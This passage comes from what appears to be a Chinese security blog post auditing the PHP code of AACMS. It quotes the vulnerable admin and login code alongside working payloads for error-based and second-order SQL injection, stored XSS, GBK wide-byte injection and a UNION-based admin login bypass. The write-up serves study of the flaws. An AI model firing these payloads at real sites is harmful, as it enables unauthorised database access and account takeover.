+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br>		<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br>			<br>		<span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br>		<span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>			<br>		<span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>			cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>		&#125;<br>		DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br>			<span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br>			<span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>			<span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>		));<br>			<br>		cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br>			<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>构造<code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p>
+<p>需要注意的是，这里的注释符不能直接输入，需要将其进行url编码后再传入</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="2-二次注入漏洞"><a href="#2-二次注入漏洞" class="headerlink" title="2.二次注入漏洞"></a>2.二次注入漏洞</h6><p>再回来看刚刚的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br>		<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br>			<br>		<span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br>		<span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>			<br>		<span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>			cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>		&#125;<br>		DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br>			<span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,		<span class="hljs-comment">// 直接向数据库中插入title</span><br>			<span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>			<span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>		));<br>			<br>		cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br>			<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>能够发现，下面还有一条插入语句，由于魔术引号已经被绕过了，所以这里也利用一下</p>
+<p>先看一下正常插入时，数据库的执行情况，执行<code>title=1&amp;url=2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Query	DESC pre_admincp_menu<br>Query	INSERT INTO pre_admincp_menu (`title`, `url`, `displayorder`) VALUES (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>看到这里就可以进行payload的构造了</p>
+<p>由于上面有<code>DB::getOne(&quot;SELECT id FROM &quot;.DB::table(&#39;admincp_menu&#39;).&quot; WHERE title=&#39;$title&#39;&quot;)</code></p>
+<p>这里对title进行了一个查询，如果将payload插入到title位置，那么将会直接导致这条sql语句无法正常执行，然后程序报错停止，所以只能将payload插入到url位置</p>
+<p>构造<code>payload:</code> <code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p>
+<p>或是：<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>，都能够实现</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，这里其实不用看代码都能够发现，大概率存在存储型的跨站</p>
+<p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>需要进行url编码</p>
+<p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="3-XSS漏洞"><a href="#3-XSS漏洞" class="headerlink" title="3.XSS漏洞"></a>3.XSS漏洞</h6><p>先跟着大佬的思路走</p>
+<p>回到admin_misc.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br>		<br>	<span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br>		<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>			<span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>		), <span class="hljs-literal">TRUE</span>);<br>	&#125;<br>		<br>	<span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>		<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在前面的通读中，已知该系统并没有对XSS进行相关校验，而就算输入经过<code>addslashes()</code>过滤，也并不会影响前段HTML标签的加载，所以上述代码中<code>$custom[url]</code>和<code>$custom[&#39;title&#39;]</code>都可能存在XSS漏洞</p>
+<p>根据前段页面的情况构造payload</p>
+<p><code>url=&quot; onclick=&quot;alert(1)</code></p>
+<p><code>title=&quot; onclick=&quot;alert(1)</code></p>
+<p>需要进行url编码后发送</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>但这里的，如果测试XSS漏洞的话，可能黑盒会更快一些，因为已经知道了web应用没有对XSS进行一个校验，所以能插入的地方，就使劲插入payload，白盒可以少一些。</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="无法复现的漏洞"><a href="#无法复现的漏洞" class="headerlink" title="无法复现的漏洞"></a>无法复现的漏洞</h5><h6 id="1-登录位置的宽字节注入"><a href="#1-登录位置的宽字节注入" class="headerlink" title="1.登录位置的宽字节注入"></a>1.登录位置的宽字节注入</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br>	<br>	<span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br>		<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br>		<br>		<span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br>		<span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>		&#125;<br>		<br>		dheader(ADMINSCRIPT);<br>		<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<br>		@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;	<br>		<span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>$username</code>直接拼接进查询语句，由于数据库编码为GBK，所以存在宽字节注入，插入payload之后，数据库执行日志如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Query	SELECT * FROM pre_member WHERE username=&#x27;admin運&#x27; or updatexml(1,concat(1,user()),1)#&#x27;<br># 将该语句代入数据库中进行执行，发现是能够成功执行的，而该web应用没有返回数据库报错信息，直接301，所以使用报错注入无法实现，猜测是这里没有开启报错信息<br># 使用时间盲注，发现无法进行延时，数据库最终执行的payload可以进行延迟，未发现原因<br># 堆叠注入同样无法进行<br></code></pre></td></tr></table></figure>
+
+<h6 id="2-后台万能密码登录"><a href="#2-后台万能密码登录" class="headerlink" title="2.后台万能密码登录"></a>2.后台万能密码登录</h6><p>还是上面的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br>	<br>	<span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br>		<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br>		<br>		<span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br>		<span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>		&#125;<br>		<br>		dheader(ADMINSCRIPT);<br>		<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<br>		@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;	<br>		<span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当用户的密码解不出来时，上面的宽字节注入漏洞就显得没多大用了，所以一个万能密码是很重要的，这里由于没有复现成功，所以就自己捋一下思路吧，为下次碰见类似做个准备</p>
+<p>首先程序根据<code>$username</code>字段去数据库中查取响应的账号信息</p>
+<p>然后对输入的密码进行一个加盐加密</p>
+<p>比对密码同时判断该账号是否为管理员</p>
+<p>OK，由于在根据<code>$username</code>去数据库查询处存在sql注入，所以，可以通过使用联合查询覆盖掉原来的查询数据，让数据库返回想要的数据</p>
+<p>根据数据库的字段，可以进行payload的构造</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p>
+<p>其中字段三为数据库加密后的密码，字段五<code>groupid</code>必须为1，字段九<code>salt</code>用于字段三加密</p>
+<p>数据库最终执行语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzz運&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p>代入数据库查询，返回的也是想要的值</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png" srcset="/img/loading.gif" lazyload></p>
+<p>但就是无法成功复现，原因仍未发现😭</p>
+<p>真菜，复现都复现不出来😒</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#PHP代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代码审计-AACMS</div>
+      <div>http://example.com/2022/02/26/代码审计-AACMS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年2月26日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/" title="小破站的SQL绕过">
+                        <span class="hidden-mobile">小破站的SQL绕过</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
